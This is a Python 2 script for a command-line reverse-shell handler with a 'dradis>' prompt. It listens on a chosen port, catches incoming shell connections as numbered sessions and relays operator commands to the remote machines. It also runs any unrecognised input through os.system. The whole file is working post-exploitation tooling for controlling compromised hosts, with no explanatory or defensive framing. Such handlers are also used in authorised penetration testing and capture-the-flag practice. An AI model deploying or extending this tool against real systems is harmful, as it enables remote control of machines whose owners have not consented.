#!/usr/bin/python
import os
import select
import socket
import sys
import threading
from cmd import Cmd

bag = {}
session = 1

class Handler(object):
    def __init__(self):

        self.listen_port = 8080
        self.listen_addr = "0.0.0.0"
        self.max_listen  = 1

class HandlerPrompt(Cmd):
    prompt = "dradis> "

    handler = Handler()

    def emptyline(self):
        pass

    def default(self,inp):
        if inp == "q" or inp == "quit":
            return True
        os.system(inp)

    def do_exit(self,inp):
        global bag

        if len(bag) > 0:
            while True:
                ans = raw_input("You have open sessions. Exit?").lower()
                if ans == "y" or ans == "yes":
                    print("Exiting")
                    for key in bag.keys():
                        bag[key][0].close()
                    return True
                elif ans == "n" or ans == "no":
                    break
        else:
            print("Exiting")
            return True

    def do_clear(self,inp):
        os.system("clear")

    def do_kill(self,inp):
        global bag

        try:
            session = int(inp)
            if session in bag.keys():
                print("Closing session %d" % session)
                bag[session][0].close()
                del bag[session]
        except ValueError as err:
            print("Invalid session")

    def do_show(self,inp):
        if inp == "options":
            print("\nListen Port:               %d" % self.handler.listen_port)
            print("Listen Addr:               %s" % self.handler.listen_addr)
            print("Max Connections:           %d\n" % self.handler.max_listen)

    def do_set(self,inp):
        args = inp.split(" ")
        try:
            num = int(args[1])
    
            if args[0] == "port":
                if int(args[1]) in range(1,65536):
                    self.handler.listen_port = int(args[1])
                else:
                    print("Select a port from 1-65535")
            elif args[0] == "max":
                if int(args[1]) in range(1,50):
                    self.handler.max_listen = int(args[1])
            else:
                self.help_set()
        except:
            self.help_set()

    def help_set(self):
        print("Set the port number to listen on or the max tcp connections.")
        print("Usage: set [port|max] <int>")

    def do_bind(self,inp):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.bind((self.handler.listen_addr,self.handler.listen_port))

            x = threading.Thread(target=self.catch_shell, args=(s,self.handler.listen_port))
            x.start()
            print("Starting listener: %s:%d" % (self.handler.listen_addr,self.handler.listen_port))
        except socket.error as err:
            print(err.strerror)

    def do_sessions(self,inp):
        for key in bag.keys():
            print("%d: %d<-----%s" % (key,bag[key][2],bag[key][1][0]))

    def do_interact(self,inp):
        try:
            sesh = int(inp)
            if sesh in bag.keys():
                self.handle_shell(sesh)
            else:
                self.help_interact()
        except (ValueError, IndexError) as err:
            self.help_interact()
            print(err)

    def help_interact(self):
        print("Interact with a session.")
        print("Usage: interact <session #>")

    def do_shell(self, inp):
        os.system(inp)

    def catch_shell(self,arg,lport):

        global session
        global bag
    
        arg.listen(self.handler.max_listen)
        client,c_info = arg.accept()
        print("\nReceving connection from %s!" % c_info[0])
        bag[session] = (client,c_info,lport)
        arg.close()
        session = session + 1
    
    def handle_shell(self,session):
    
        callback = bag[session][0]
        c_info = bag[session][1]
        sys.stdout.write("%s>" % c_info[0])
        sys.stdout.flush()
        while True:

            # ulitizes select to determine which stream has data to be received from
            sock_list = [sys.stdin,callback]
            read_sockets, write_socket, error_socket = select.select(sock_list,[],[])
    
            for sock in read_sockets:
                if sock == callback:
                    data = b""
                    buffer = 1024
                    while True:
                        message = sock.recv(buffer)
                        data += message
                        if message[-1] == "\n":
                            break
                    sys.stdout.write("\n" + data + "%s>" % c_info[0])
                    sys.stdout.flush()
                else:
                    message = sys.stdin.readline().strip()
                    if message.strip() == "exit" or message.strip() == "background":
                        break
                    else:
                        callback.send(message + '\n')
                        sys.stdout.write("%s>" % c_info[0])
                        sys.stdout.flush()
    
            if message == "exit":
                callback.send(message + '\n')
                callback.shutdown(socket.SHUT_RDWR)
                callback.close()
                print("Closing down session %d" % session)
                del bag[session]
                break
            elif message == "background":
                break 

def main():
    p = HandlerPrompt()
    p.cmdloop()
    
if __name__ == "__main__":
    main()
